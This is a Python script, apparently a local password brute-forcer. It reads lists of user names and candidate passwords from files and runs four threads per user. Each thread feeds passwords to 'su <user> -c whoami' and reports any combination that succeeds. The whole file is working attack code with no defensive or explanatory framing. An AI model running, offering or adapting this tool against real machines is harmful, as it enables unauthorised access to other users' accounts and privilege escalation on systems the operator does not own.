from subprocess import PIPE,Popen, DEVNULL
from sys import argv
import queue
import threading

finishedFlag=0

def check_file(possible_path: str)-> list[bytes]:
    try:
        return list(map(lambda x: x[:-1], open(possible_path, 'rb').readlines()))
    except FileNotFoundError:
        return [bytes(possible_path,'utf-8')]

class bruterThread(threading.Thread):
    def __init__(self, threadID, targetUser, passwdq):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.tuser = targetUser
        self.passwdq = passwdq

    def run(self):
        sudo_bruteforce(self.threadID,self.tuser, self.passwdq)

def sudo_bruteforce(id, user, passwdq):
    global finishedFlag

    while not finishedFlag and not passwdq.empty():
        password=passwdq.get()
        
        print(f"thread# {id} testing:{user} with {password}")
        su_test = Popen(
            ["su", user,"-c","whoami"],
            stdin=PIPE,
            stdout=PIPE,
            stderr=DEVNULL
        )
        stdout_data = su_test.communicate(input=password)[0]
        if user in stdout_data:
            print(f"[+] Success with {user.decode('utf-8')}:{password.decode('utf-8')}")
            finishedFlag = 1

def main():
    users = check_file(argv[1])
    global finishedFlag
    passwords = check_file(argv[2])
    passwordQueue = queue.Queue(len(passwords))
    threads=[]

    for user in users:
        #Regenerate password work queue for each user
        for password in passwords:
            passwordQueue.put(password)
        
        #Add more threads
        thread1 = bruterThread(1, user, passwordQueue)
        thread1.start()
        threads.append(thread1)
        print("starting thread 1")

        thread2 = bruterThread(2, user, passwordQueue)
        thread2.start()
        threads.append(thread2)
        print("starting thread 2")

        thread3 = bruterThread(3, user, passwordQueue)
        thread3.start()
        threads.append(thread3)
        print("starting thread 3")

        thread4 = bruterThread(4, user, passwordQueue)
        thread4.start()
        threads.append(thread4)
        print("starting thread 4")

        for t in threads:
            t.join()
        
        print(f"[+] finished testing: {user}")

if __name__ == "__main__":
    main()